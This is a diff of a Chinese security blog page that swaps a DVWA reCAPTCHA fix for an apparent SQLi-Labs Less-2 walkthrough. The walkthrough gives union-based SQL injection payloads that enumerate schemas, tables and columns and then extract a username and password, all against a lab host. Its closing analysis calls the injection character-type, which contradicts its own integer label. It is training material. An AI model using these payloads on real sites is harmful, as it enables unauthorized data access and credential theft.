@@ -4,16 +4,11 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
-    <meta name="keywords" content="解决DVWA中reCAPTCHA API key missing from config file, z1r0s 安全 Web安全 学习总结">
+    <meta name="keywords" content="SQL注入之GET-ErrorBasd-IntigerBased, z1r0s 安全 Web安全 学习总结">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="0x01 问题描述​        在DVWA中测试Insecure CAPTCHA不安全的验证码关卡时，出现下图报错内容：
-
-
-
-
-0x02 解决思路​        根据报错提示信息应该是reCAPTCHA的问题，根据提示路径信息打开c">
+    <meta name="description" content="0x01 SQL注入&amp;emsp;&amp;emsp;SQL注入就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来    实现对数据">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +16,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>解决DVWA中reCAPTCHA API key missing from config file | z1r0s&#39;blogs</title>
+    <title>SQL注入之GET-ErrorBasd-IntigerBased | z1r0s&#39;blogs</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -310,7 +305,7 @@
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '';
+        let pwd = '9df936306f28221960380bb10b6a8e8f4dd68440ba011e1359aca651d016be86';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误，将返回主页！');
@@ -323,13 +318,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/57.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        解决DVWA中reCAPTCHA API key missing from config file
+                        SQL注入之GET-ErrorBasd-IntigerBased
                     </div>
                 </div>
             </div>
@@ -440,8 +435,12 @@
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/DVWA/" target="_blank">
-                            <span class="chip bg-color">DVWA</span>
+                        <a href="/tags/SQLi/" target="_blank">
+                            <span class="chip bg-color">SQLi</span>
+                        </a>
+                        
+                        <a href="/tags/MySQL/" target="_blank">
+                            <span class="chip bg-color">MySQL</span>
                         </a>
                         
                     </div>
@@ -452,8 +451,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/debug/" class="post-category" target="_blank">
-                            debug
+                        <a href="/categories/SQLi/" class="post-category" target="_blank">
+                            SQLi
                         </a>
                         
                     </div>
@@ -464,7 +463,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-09-14
+                    2020-10-17
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -478,14 +477,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    235
+                    1.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    6 分
                 </div>
                 
                 
@@ -501,32 +500,121 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x01-问题描述"><a href="#0x01-问题描述" class="headerlink" title="0x01 问题描述"></a>0x01 问题描述</h1><p>​        在DVWA中测试<code>Insecure CAPTCHA</code>不安全的验证码关卡时，出现下图报错内容：</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/DVWA/InsecureCAPTCHA/不安全验证码报错界面.png" alt="不安全验证码报错界面"></center>
+                <h1 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h1><p>&emsp;&emsp;<strong>SQL注入</strong>就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来    实现对数据库的任意操作。</p>
+<p>&emsp;&emsp;SQL注入<strong>按参数的数字类型</strong>可分为：<code>数字型(Integer)</code>、<code>字符型(String)</code>；<strong>按返回结果</strong>可分为：<code>显错注入(Error-Based)</code>、<code>基于布尔的盲注(Boolean-Based Blind)</code>、<code>基于时间的盲注(Time-Based Blind)</code>；<strong>按HTTP请求类型</strong>可分为：<code>GET型注入(GET)</code>、<code>POST型注入(POST)</code>。本文测试的注入类型为：GET型、显错型、数值型注入。</p>
+<h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul>
+<li>服务器系统：<code>Windows Server 2008</code></li>
+<li>中间件：<code>IIS</code></li>
+<li>数据库：<code>MySQL</code></li>
+<li>客户机：<code>Windows 10</code></li>
+<li>靶机：<code>SQLi-Labs</code></li>
+</ul>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/实验界面.png" alt="实验界面"></center>
 
 
 
-<h1 id="0x02-解决思路"><a href="#0x02-解决思路" class="headerlink" title="0x02 解决思路"></a>0x02 解决思路</h1><p>​        根据报错提示信息应该是<code>reCAPTCHA</code>的问题，根据提示路径信息打开<code>config.inc.php</code>文件，显示与<code>reCAPTCHA</code>相关信息如下图所示：</p>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/DVWA/InsecureCAPTCHA/配置文件中reCAPTCHA设置为空.png" alt="配置文件中reCAPTCHA设置为空"></center>
-
-<p>​        由图片信息可知，具体的出错原因是因为使用<code>reCAPTCHA</code>没有申请密钥，因此需要手动填入密钥。</p>
-<h1 id="0x03-解决步骤"><a href="#0x03-解决步骤" class="headerlink" title="0x03 解决步骤"></a>0x03 解决步骤</h1><ol>
-<li>打开<code>config.inc.php</code>配置文件，并将<code>recaptcha</code>相关参数修改成如下内容：</li>
+<h1 id="0x03-实验工具"><a href="#0x03-实验工具" class="headerlink" title="0x03 实验工具"></a>0x03 实验工具</h1><ul>
+<li><code>FireFox</code></li>
+<li><code>HackBar</code></li>
+</ul>
+<h1 id="0x04-注入步骤"><a href="#0x04-注入步骤" class="headerlink" title="0x04 注入步骤"></a>0x04 注入步骤</h1><ol>
+<li><strong>注入点判断</strong>。判断测试点是否存在SQL注入漏洞。</li>
+<li><strong>注入类型判断</strong>。主要是判断注入点位置使用的SQL语句格式，若单引号未被过滤或转义，且回显报错信息，则使用单引号可以快速判断出注入类型。</li>
+<li><strong>判断SQL语句中的列数</strong>。注入点正常显示的数据往往不是我们想要得到的数据，通常我们需要使用<code>union</code>或<code>报错</code>等操作，使得此注入点显示的数据是我们想要得到的，但构造我们需要的查询时必须要知道此位置的SQL语句中的列数，否则SQL执行时会发生错误。</li>
+<li><strong>判断SQL语句操作的回显</strong>。判断SQL回显主要是通过对比来判断。使用<code>union</code>查询时我们需要找一个在前端显示的点，让我们查询到的数据显示出来；使用报错注入时也需要在前端显示我们想要得到的数据，所以需要先找到类似的回显，报错注入可以根据对比不同payload操作结果的对比来判断。但当该位置不存在回显信息或回显的错误信息被屏蔽时，我们可以采用对比响应的时候来判断回显，基于时间的盲注即采取这种方式。</li>
+<li><strong>构造SQL注入获取数据库指纹等</strong>。在爆数据库内部信息时，需要先得到<code>数据库用户名</code>、<code>版本</code>、<code>数据库名称</code>等消息，这会对我们的后续注入有很大的帮助。例如：MySQL数据库5.0版本之后和之前的注入操作会有些许差别，另外数据库信息对我们查找对应的<code>1day</code>有很大的帮助。</li>
+<li><strong>构造SQL语句爆数据表名</strong>。对数据库进行爆破的最终目的是爆数据库字段值，但在爆字段值之前我们需要知道相对应的字段名和表名，因此开始正式爆破时，需要先得到数据库的表名信息。</li>
+<li><strong>构造SQL语句爆字段名</strong>。在拿到数据库表名信息后，需要继续爆破表中的字段值，以判断哪些字段是我们想要得到的。</li>
+<li><strong>构造SQL语句爆字段值</strong>。爆破的最终目的就是爆表中的字段值，再得到表名、字段名后就需要尝试爆我们想要得到的字段值。</li>
 </ol>
-<pre class=" language-ini"><code class="language-ini">$_DVWA[ 'recaptcha_public_key' ]  <span class="token attr-value"><span class="token punctuation">=</span> '6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg';</span>
-$_DVWA[ 'recaptcha_private_key' ] <span class="token attr-value"><span class="token punctuation">=</span> '6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ';</span></code></pre>
-<p>​    也可以到<a href="https://www.google.com/recaptcha/admin" target="_blank" rel="noopener">reCAPTCHA申请页面</a>申请一对网站密钥，具体操作可参考<a href="https://blog.csdn.net/dulinanaaa/article/details/88126607" target="_blank" rel="noopener">reCaptcha 的使用</a>。</p>
-<ol start="2">
-<li>保存更改后的配置文件后，重新访问<code>Insecure CAPTCHA</code>模块，没有发现错误信息。</li>
+<h1 id="0x05-实验步骤"><a href="#0x05-实验步骤" class="headerlink" title="0x05 实验步骤"></a>0x05 实验步骤</h1><ol>
+<li><p>按照页面提示信息在地址栏中访问<code>http://10.10.10.148:86/Less-2/index.php?id=1</code>，结果展示如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/正常访问结果显示.png" alt="正常访问结果显示"></center>
+</li>
+<li><p>使用单引号测试SQL语句类型。在浏览器地址栏中输入:<code>10.10.10.148:86/Less-2/index.php?id=1&#39;</code>，访问结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/单引号测试结果.png" alt="单引号测试结果"></center>
+</li>
+<li><p>由上图中的报错信息可以推测出SQL语句大致为：<code>select * from users where id=参数 limit 0，1;</code>，<font color="red">参数为<code>Intiger</code>型</font>。因此，我们可以构造的恒真语句为：</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token number">1</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
+<span class="token number">1</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<p>其中<code>1 or 1=1</code>payload的操作结果如下图所示。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/or恒真payload构造.png" alt="1 or 1=1payload的操作结果"></center>
+</li>
+<li><p>使用<code>order by</code>语句来获取SQL查询结果的列数。使用如下payload的执行结果如下图所示。</p>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment" spellcheck="true">--+</span>
+?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/orderby1.png" alt="order by 1操作结果"></center>
+
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/orderby2操作结果.png" alt="order by 2操作结果"></center>
+
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/orderby3操作结果.png" alt="order by 3操作结果"></center>
+
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/orderby4操作结果.png" alt="order by 4操作结果"></center>
+</li>
+<li><p>由上述操作结果表明，该位置的SQL语句查询结果为3列。因此我们使用如下所示的payload来判断该注入点的回显位置，操作结果如下图所示。</p>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,2,3--+</span></code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/unionselect语句判断SQLi回显位置.png" alt="unionselect语句判断SQLi回显位置"></center>
+
+<p>注：</p>
+<ul>
+<li>使用<code>union</code>进行联合查询是想要查询的数据回显，则需要第一个查询结果为空。</li>
+</ul>
+</li>
+<li><p>使用<code>user()、database()、version()</code>函数等获取当前数据库的信息，payload如下所示，操作结果如下图所示。</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 获取当前用户信息</span>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,user(),3--+</span>
+<span class="token comment" spellcheck="true">-- 获取当前数据库名称</span>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,database(),3--+</span>
+<span class="token comment" spellcheck="true">-- 获取当前数据库版本信息</span>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,version(),3--+</span>
+<span class="token comment" spellcheck="true">-- 获取数据库的路径信息</span>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,@@datadir,3--+</span>
+<span class="token comment" spellcheck="true">-- 获取当前系统的版本信息</span>
+http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,@@version_compile_os,3--+</span></code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/获取当前用户信息.png" alt="获取当前用户信息"></center>
+
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/获取当前数据库名称.png" alt="获取当前数据库名称"></center>
+
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/获取数据库版本信息.png" alt="获取数据库版本信息"></center>
+
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/获取数据库路径信息.png" alt="获取数据库路径信息"></center>
+
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/获取服务器系统的版本信息.png" alt="获取服务器系统的版本信息"></center>
+</li>
+<li><p>由上述操作得知MySQL的版本为：<code>5.1.73</code>，因此数据库中存在<code>information_schema</code>数据库，因此可以使用如下payload爆MySQL中所有数据库名称，操作结果如下图所示。</p>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span></code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/爆出所有数据库名称.png" alt="爆出所有数据库名称"></center>
+</li>
+<li><p>在得到数据库名称后，可以继续爆数据库中的数据表，使用如下所示的payload可以爆出<code>security</code>数据库中所有的数据表名称，操作结果如下图所示。</p>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</span></code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/爆出Security数据库中所有数据表名称.png" alt="爆出Security数据库中所有数据表名称"></center>
+</li>
+<li><p>在得到数据表名称后，可以继续爆数据表中的字段信息，使用如下所示的payload可以爆出<code>users</code>表中所有的列名，操作结果如下图所示。</p>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+</span></code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/爆出users表中所有列名称.png" alt="爆出users表中所有列名称"></center>
+</li>
+<li><p>在得到数据库名称、数据表名称、数据列名称后，可以继续爆数据表中的字段值，使用如下所示的payload可以爆出id为2的用户名和密码，操作结果如下图所示。</p>
+<pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-2/index.php?id=-1 union select 1,username,password from users where id=2--+</span></code></pre>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-ErrorBasd-IntigerBased/爆字段值.png" alt="爆字段值"></center>
+
+
+
+</li>
 </ol>
-<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/DVWA/InsecureCAPTCHA/不安全验证码界面正常显示.png" alt="不安全验证码界面正常显示"></center>
-
-
-
-<h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><ul>
-<li><a href="https://www.itfd.cn/post-757.html" target="_blank" rel="noopener">解决DVWA中reCAPTCHA API key missing from config file问题</a></li>
-<li><a href="https://www.jianshu.com/p/9ef5f9b0844f" target="_blank" rel="noopener">DVWA报错： reCAPTCHA API key missing from config file error</a></li>
-<li><a href="https://blog.csdn.net/dulinanaaa/article/details/88126607" target="_blank" rel="noopener">reCaptcha 的使用</a></li>
+<h1 id="0x06-实验分析"><a href="#0x06-实验分析" class="headerlink" title="0x06 实验分析"></a>0x06 实验分析</h1><p>&emsp;&emsp;此实验模拟的一个具有错误回显的字符型注入。最终的操作是得到一组用户名及其密码。</p>
+<ul>
+<li>HTTP请求为：<code>GET</code></li>
+<li>参数格式为：<code>select * from users where id=参数;</code></li>
+<li>未进行转义、过滤等</li>
+<li>可使用单引号判断注入类型</li>
+</ul>
+<h1 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h1><ul>
+<li><p><a href="https://z1r0s.github.io/2020/09/29/mysql-zhu-ru-chang-yong-han-shu/">MySQL注入常用函数</a></p>
+</li>
+<li><p><a href="https://z1r0s.github.io/2020/09/07/sql-zhu-ru-bi-ji/">MySQL注入笔记</a></p>
+</li>
 </ul>
 
             </div>
@@ -684,8 +772,8 @@ $_DVWA[ 'recaptcha_private_key' ] <span class="token attr-value"><span class="to
             </div>
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
-                  property="dct:title" rel="dct:type">《解决DVWA中reCAPTCHA API key missing from config file》</span> 由 <a
-                    xmlns:cc="http://creativecommons.org/ns#" href="/2020/09/14/jie-jue-dvwa-zhong-recaptcha-api-key-missing-from-config-file/"
+                  property="dct:title" rel="dct:type">《SQL注入之GET-ErrorBasd-IntigerBased》</span> 由 <a
+                    xmlns:cc="http://creativecommons.org/ns#" href="/2020/10/17/sql-zhu-ru-zhi-get-errorbasd-intigerbased/"
                     property="cc:attributionName"
                     rel="cc:attributionURL">z1r0s</a> 采用
             <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">
@@ -725,55 +813,51 @@ $_DVWA[ 'recaptcha_private_key' ] <span class="token attr-value"><span class="to
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/09/16/github-shen-tou-ce-shi-gong-ju-ku-2020-ban/">
+                <a href="/2020/10/17/sql-zhu-ru-zhi-get-errorbasd-intigerbased/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="GitHub渗透测试工具库(2020版)[转]">
+                        <img src="/medias/featureimages/57.jpg" class="responsive-img" alt="SQL注入之GET-ErrorBasd-IntigerBased">
                         
-                        <span class="card-title">GitHub渗透测试工具库(2020版)[转]</span>
+                        <span class="card-title">SQL注入之GET-ErrorBasd-IntigerBased</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            1.前言​        今天看到一个博客里有这个置顶的工具清单，但是发现这些都是很早以前就有文章发出来的，我爬下来后一直放在txt里吃土。这里一起放出来。
-2.漏洞练习平台WebGoat漏洞练习平台:
-https://github.com
+                            0x01 SQL注入&emsp;&emsp;SQL注入就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来    实现对数据
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-09-16
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-10-17
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/工具库/" class="post-category" target="_blank">
-                                    工具库
+                            <a href="/categories/SQLi/" class="post-category" target="_blank">
+                                    SQLi
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/github/" target="_blank">
-                        <span class="chip bg-color">github</span>
+                    <a href="/tags/SQLi/" target="_blank">
+                        <span class="chip bg-color">SQLi</span>
                     </a>
                     
-                    <a href="/tags/渗透测试/" target="_blank">
-                        <span class="chip bg-color">渗透测试</span>
-                    </a>
-                    
-                    <a href="/tags/工具/" target="_blank">
-                        <span class="chip bg-color">工具</span>
+                    <a href="/tags/MySQL/" target="_blank">
+                        <span class="chip bg-color">MySQL</span>
                     </a>
                     
                 </div>
@@ -787,50 +871,30 @@ https://github.com
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/09/14/dvwa-fileupload/">
+                <a href="/2020/10/17/sql-zhu-ru-zhi-get-errorbased-singlequotes-string/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/67.jpg" class="responsive-img" alt="DVWA-FileUpload">
+                        <img src="/medias/featureimages/56.jpg" class="responsive-img" alt="SQL注入之GET-ErrorBased-SingleQuotes-String">
                         
-                        <span class="card-title">DVWA-FileUpload</span>
+                        <span class="card-title">SQL注入之GET-ErrorBased-SingleQuotes-String</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0x01 漏洞概述​        文件上传是指攻击者通过上传可执行脚本功能，从而获取服务器端可执行命令的权限。
-File Upload模块解析：
-
-文件上传界面
-
-
-
-
-文件上传操作结果
-
-
-
-
-
-0x02 测试工具
-FireFox
-Bu
+                            0x01 SQL注入&emsp;&emsp;SQL注入就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来    实现对数据
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-09-14
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-10-17
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web安全/" class="post-category" target="_blank">
-                                    Web安全
-                                </a>
-                            
-                            <a href="/categories/Web安全/靶机/" class="post-category" target="_blank">
-                                    靶机
+                            <a href="/categories/SQLi/" class="post-category" target="_blank">
+                                    SQLi
                                 </a>
                             
                             
@@ -840,12 +904,12 @@ Bu
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/DVWA/" target="_blank">
-                        <span class="chip bg-color">DVWA</span>
+                    <a href="/tags/SQLi/" target="_blank">
+                        <span class="chip bg-color">SQLi</span>
                     </a>
                     
-                    <a href="/tags/文件上传/" target="_blank">
-                        <span class="chip bg-color">文件上传</span>
+                    <a href="/tags/MySQL/" target="_blank">
+                        <span class="chip bg-color">MySQL</span>
                     </a>
                     
                 </div>
